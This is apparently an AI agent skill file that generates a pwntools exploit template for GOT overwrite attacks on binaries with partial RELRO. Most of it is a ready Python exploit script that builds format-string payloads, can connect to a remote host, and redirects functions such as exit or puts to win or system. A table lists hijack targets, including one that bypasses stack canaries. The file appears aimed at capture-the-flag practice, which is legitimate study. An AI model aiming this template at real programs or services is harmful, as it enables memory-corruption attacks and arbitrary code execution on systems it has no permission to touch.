---
name: pwn-got-overwrite
description: Generate GOT overwrite exploit template for partial RELRO binaries
argument-hint: "<binary>"
allowed-tools: ["Bash", "Read", "Write"]
---

# PWN GOT Overwrite - GOT Hijacking Template

Generate a GOT overwrite exploit for binaries with partial RELRO.

## Prerequisites

- Partial RELRO (not Full RELRO)
- Write primitive (format string or arbitrary write)
- Target function that gets called after overwrite

## Generated Template

```python
#!/usr/bin/env python3
"""
GOT Overwrite Exploit
Target: <binary>
Requirement: Partial RELRO
"""
from pwn import *

# === CONFIGURATION ===
BINARY = './<binary>'

# === SETUP ===
elf = ELF(BINARY)
context.binary = elf

def conn():
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    elif args.GDB:
        return gdb.debug(BINARY, '''
            b main
            c
        ''')
    else:
        return process(BINARY)

def main():
    io = conn()

    # === GOT ENTRIES ===
    log.info("GOT Entries:")
    for name, addr in elf.got.items():
        print(f"  {name}: {hex(addr)}")

    # === COMMON TARGETS ===
    # Overwrite exit() to call win() or main()
    target_got = elf.got['exit']      # Function to hijack
    new_value = elf.symbols['win']    # Where to redirect

    # Or redirect to system() in libc (after leak)
    # new_value = libc.symbols['system']

    log.info(f"Overwriting {hex(target_got)} with {hex(new_value)}")

    # === WRITE PRIMITIVE ===

    # Option 1: Format string
    FMT_OFFSET = 6  # TODO: Find correct offset
    writes = {target_got: new_value}
    payload = fmtstr_payload(FMT_OFFSET, writes)

    # Option 2: Arbitrary write gadget
    # payload = p64(target_got) + p64(new_value)
    # Use write-what-where gadget

    io.sendline(payload)

    # === TRIGGER OVERWRITTEN FUNCTION ===
    # May happen automatically (exit at end)
    # Or send input to trigger call

    io.interactive()

if __name__ == '__main__':
    main()
```

## Common GOT Targets

| Overwrite | With | Effect |
|-----------|------|--------|
| `exit` | `main` | Loop for more inputs |
| `exit` | `win` | Direct win |
| `puts` | `system` | puts(cmd) → system(cmd) |
| `printf` | `system` | printf(cmd) → system(cmd) |
| `__stack_chk_fail` | `win` | Bypass canary check |

## Verification

```bash
# Check RELRO status
checksec --file=./binary
# Must show "Partial RELRO", not "Full RELRO"

# List GOT entries
objdump -R ./binary
```
